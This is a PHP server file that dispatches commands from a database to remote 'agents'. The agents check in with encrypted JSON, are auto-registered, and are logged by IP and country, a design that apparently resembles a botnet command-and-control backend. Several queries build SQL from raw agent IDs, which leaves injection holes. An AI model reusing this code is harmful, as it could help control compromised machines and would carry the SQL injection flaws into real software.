<?php
require_once(__DIR__ . "/lib.php");

function handle($data)
{
    $config = include(__DIR__ . "/config.php");
    $d = decrypt($data, $config);
    $clear_data = json_decode($d, true, 512, JSON_BIGINT_AS_STRING);
    if ($clear_data != NULL && checkParams($clear_data)) {
        if (!record_new_connection($config, $clear_data)) die;
        $result = null;
        switch ($clear_data["type"]) {
            case "GETJOB":
                $result = json_encode(getJob($config, $clear_data['appid'], $clear_data['time'], $clear_data['customField']));
                break;
            case "ACCEPTEDJOB":
                $result = json_encode(acceptJob($config, $clear_data['appid'], $clear_data['time'], $clear_data['customField']));
                break;
            case "DONEJOB":
                $result = json_encode(doneJob($config, $clear_data['appid'], $clear_data['time'], $clear_data['customField']));
                break;
            default:
                return false;
        }
        //return encrypt($result,$config);
        return $result;
    } else
        return false;
}

function getJob($config, $agent_id, $timestamp, $fields = null)
{
    $db = getDb($config);
    $task = find_free_tasks($db, $agent_id);
    if ($task === null)
        return [
            "result" => "DONE",
            "tasks" => "NOTASKS",
        ];
    else {
        return [
            "result" => "DONE",
            "tasks" => "HAVEJOB",
            "command" => $task["type"],
            "additional" => json_decode($task["additional"]),

        ];
    }
}


function acceptJob($config, $appid, $timestamp, $fields = null)
{
    accept_current_task_for($appid, $config);
    return [
        "result" => "DONE",
    ];
}


function doneJob($config, $appid, $timestamp, $fields = null)
{
    $update = "SELECT * FROM task_agents where agent_id = {$appid} AND status = " . TASK_STATUS_ACCEPTED . ";";
    $db = getDb($config);
    /* @var $query PDOStatement */
    $query = $db->query($update);
    $fetched = $query->fetchAll(PDO::FETCH_ASSOC);

    if (count($fetched) > 0) {
        $task = $fetched[0];
        $update = "UPDATE task_agents SET status = " . TASK_STATUS_DONE . " WHERE agent_id = {$appid} AND task_id = {$task["task_id"]};";
        $db->exec($update);
    }
    return [
        "result" => "DONE",
    ];
}

function find_free_tasks($db, $agent_id)
{
    /** @var $db PDO */
    if (add_newbie($db, $agent_id)) {
        //common tasks
        return get_common_task($db, $agent_id);
    } else {
        $sql = "SELECT * FROM task_agents LEFT JOIN task ON `task`.`id` = `task_agents`.`task_id` WHERE agent_id = :id;";
        $s = $db->prepare($sql);
        $s->execute([
            ':id' => $agent_id,
           // ':status' => TASK_STATUS_DONE,
        ]);
        $available_tasks = $s->fetchAll(PDO::FETCH_ASSOC);
        $done_ids = get_task_ids($available_tasks);
        $task_to_do = null;
        //Search available tasks;
        $task_to_do = search_task_in($available_tasks);
        if ($task_to_do == null) {
            if (count($available_tasks) == 0) {
                $task_to_do = get_common_task($db, $agent_id);
            }
            if ($task_to_do == null) {
                $task_to_do = get_common_tasks_without_for($db, $done_ids, $agent_id);
            }
            if ($task_to_do == null) {
                $task_to_do = get_special_task($db, $agent_id, $done_ids);
            }
        }
        return $task_to_do;
    }
}

function get_common_tasks_without_for($db, $task_ids, $agent_id)
{
    /** @var $db PDO */
    $sql = "SELECT * FROM task WHERE id NOT IN ( '" . implode("','", $task_ids) . "' ) AND is_common = " . TASK_COMMON;
    $rows = $db->query($sql, PDO::FETCH_ASSOC)->fetchAll();
    if (count($rows) == 0)
        return null;
    else {
        $task = $rows[0];
        $status = TASK_STATUS_WAITING_ACCEPT;
        $insert = "INSERT INTO task_agents (`task_id`,`agent_id`,`status`) VALUES ({$task['id']}, {$agent_id},{$status})";
        $db->exec($insert);
        return $task;
    }
}

function get_special_task($db, $agent_id, $done_ids)
{
    /** @var $db PDO */
    $sql = 'SELECT task.*,task_agents.* FROM task_group LEFT JOIN task ON task.id = task_id LEFT JOIN agent_group ON task_group.group_id = agent_group.group_id LEFT JOIN task_agents ON task.id = task_agents.task_id AND task_agents.agent_id = :id WHERE task.is_common = :task_type AND agent_group.agent_id = :id';
    //$sql = 'SELECT task.* FROM task_group LEFT JOIN task ON task.id = task_id LEFT JOIN agent_group ON task_group.group_id = agent_group.group_id WHERE task.is_common = :task_type AND agent_group.agent_id = :id';

    $s = $db->prepare($sql);
    $s->execute([
        ':task_type' => TASK_PRIVATE,
        ':id' => $agent_id,
    ]);
    $tasks = $s->fetchAll(PDO::FETCH_ASSOC);
    if ($tasks !== false && count($tasks) > 0) {
        $task = search_task_in($tasks, $done_ids);
        write_start_task($db, $agent_id, $task);
        return $task;
    } else return null;
}

function search_task_in($task_array, $done_ids = [])
{
    $task_to_do = null;
    foreach ($task_array as $task) {
        if ($task["status"] == TASK_STATUS_ACCEPTED || $task["status"] == TASK_STATUS_WAITING_ACCEPT) {
            return $task; //он уже выполняет работу
        }
        if ($task["status"] == TASK_STATUS_DONE || array_search($task['id'],$done_ids) !== false)
            continue;
        return $task;
    }
    return $task_to_do;
}

function get_task_ids($task_array)
{
    $task_ids = [];
    foreach ($task_array as $task) {
        $task_ids[] = $task["task_id"];
    }
    return $task_ids;
}


function get_common_task($db, $agent_id)
{
    $common_tasks = "SELECT * FROM task WHERE is_common = " . TASK_COMMON . ";";
    $tasks = $db->query($common_tasks)->fetchAll(PDO::FETCH_ASSOC);

    if ($tasks !== null && count($tasks) > 0) {
        $task = $tasks[0];
        if ($task != null)
            write_start_task($db, $agent_id, $task);
        return $task;
    } else return null;
}

function write_start_task($db, $agent_id, $task)
{
    /** @var $db PDO */
    $status = TASK_STATUS_WAITING_ACCEPT;
    $insert = "INSERT INTO task_agents (`task_id`,`agent_id`,`status`) VALUES (:task_id,:agent_id,:status)";
    $s = $db->prepare($insert);
    $s->execute([
        ':task_id' => $task['id'],
        ':agent_id' => $agent_id,
        ':status' => TASK_STATUS_WAITING_ACCEPT,
    ]);
    return $s->errorCode() == "00000";
}

function add_newbie($db, $agent_id)
{
    $select = "SELECT * FROM agent where id = {$agent_id};";
    /* @var $db PDO */
    $query = $db->query($select);
    if (count($query->fetchAll()) == 0) {
        $db->exec("INSERT INTO `agent` (`id`) VALUES ({$agent_id})");
        return true;
    } else return false;
}

function record_new_connection($config, $json)
{
    if (!(isset($_SERVER["REMOTE_ADDR"]) || isset($_SERVER["REMOTE_HOST"])))
        return false;
    $ip = $_SERVER['REMOTE_ADDR'];
    $sql = "INSERT INTO connections (appid,ip,country,custom,`timestamp`) VALUES (:appid,:ip,:country,:custom,:timestamp)";
    $db = getDb($config);
    $custom = json_encode($json['customField']);
    if ($custom === false)
        $custom = null;

    $ar = [
        ':appid' => intval($json["appid"]),
        ':ip' => $ip,
        ':country' => strval(getCountry($ip,$GLOBALS['_gi'])),
        ':timestamp' => intval($json["time"]),
        ':custom' => $custom,
    ];
    $s = $db->prepare($sql);
    return $s->execute($ar);
}

function accept_current_task_for($agent_id, $config)
{
    $db = getDb($config);
    $statement = $db->prepare("SELECT task_id FROM task_agents WHERE agent_id = :agent_id AND status = :status");
    $statement->execute([":agent_id" => $agent_id, ":status" => TASK_STATUS_WAITING_ACCEPT]);
    $task_id = $statement->fetchColumn(0);
    if ($task_id !== false && $task_id >= 1) {
        return $db->prepare("UPDATE task_agents SET `status` = :status WHERE `agent_id` = :agent_id AND task_id = :task_id;")
            ->execute([
                ":status" => TASK_STATUS_ACCEPTED,
                ":agent_id" => $agent_id,
                ":task_id" => $task_id,
            ]);
    } else return false;
}

function checkParams($d)
{
    //Дописать
    return isset($d["appid"]) && isset($d["time"]) && isset($d['type'])
    && (intval($d["appid"]) != 0) && (intval($d["time"]) != 0);
}

